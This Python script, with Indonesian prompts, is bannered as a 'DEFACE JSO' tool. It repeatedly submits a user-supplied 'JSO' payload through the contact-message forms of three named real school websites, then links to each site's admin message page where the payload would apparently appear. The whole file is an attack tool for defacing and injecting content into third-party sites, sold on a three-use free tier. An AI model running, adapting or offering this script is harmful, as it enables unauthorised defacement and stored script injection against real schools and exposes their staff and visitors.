import requests
import time
import os
from colorama import Fore,Back,init,Style
import os

init(autoreset=True)

jum = 10

B = Fore.BLUE
C = Fore.CYAN
BR = Style.BRIGHT
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW


# File untuk menyimpan jumlah pemakaian
counter_file = os.path.expanduser("~/.script_counter_py")

# Jika file belum ada, buat dengan nilai 0
if not os.path.exists(counter_file):
    with open(counter_file, 'w') as file:
        file.write("0")

# Ambil nilai counter
with open(counter_file, 'r') as file:
    counter = int(file.read())

# Periksa apakah sudah digunakan 3 kali
if counter >= 3:
    print("Script ini sudah digunakan 3 kali, beli premium atuh kang")
    exit()

# Tambah counter dan simpan kembali
counter += 1
with open(counter_file, 'w') as file:
    file.write(str(counter))

# Tambahkan perintah script kamu di bawah ini
print(f"Script sedang berjalan... (Penggunaan ke-{counter})")

# Tambahkan fungsi script kamu di sini
os.system('clear')
print(f"""{G}{BR}
                                                                                             
 ______  _______ _______ _______ _______ _______      _____ _______  _____ 
 |     \ |______ |______ |_____| |       |______        |   |______ |     |
 |_____/ |______ |       |     | |_____  |______      __|   ______| |_____|
""")

print(f"Status:{R}Free")

# List URL endpoint untuk mengirimkan data formulir
urls = [
    "https://www.pengumuman.smkp6jatisrono.sch.id/index.php?page=kirimpesan",
    "https://www.sman1ambarawalpg.sch.id/asik/index.php?page=kirimpesan",
    "https://www.un2020.smkn3baubau.sch.id/index.php?page=kirimpesan"
]

hasil = [
    "https://www.pengumuman.smkp6jatisrono.sch.id/admin/hubungi.php",
    "https://www.sman1ambarawalpg.sch.id/asik/admin/hubungi.php",
    "https://www.un2020.smkn3baubau.sch.id/admin/hubungi.php"
]

nama = input("Masukan Nama Mu: ")
email = input("Masukan Email mu (tanpa @gmail.com) : ")
pesan = input("Masukan JSO mu: ")

# Data formulir
data = {
    'nama': nama,
    'email': email + '@satupersen.com',
    'pesan': pesan
}

for i in range(jum):
    for i, url in enumerate(urls):
        # Kirimkan data formulir menggunakan POST request
        response = requests.post(url, data=data)
        
        # Tampilkan status code untuk verifikasi pengiriman
        print(f"{Y}{BR}Status Code untuk URL {url}: {response.status_code}")
        
        # Tampilkan pesan konfirmasi
        if response.ok:
            print(f"{G}Pesan berhasil dikirim. Hasil-nya: {hasil[i]}")
        else:
            print(f"{R}Terjadi kesalahan dalam pengiriman pesan.")
        
        print()  # Baris kosong untuk pemisah antar iterasi
    
    # Jeda selama 10 detik sebelum pengiriman berikutnya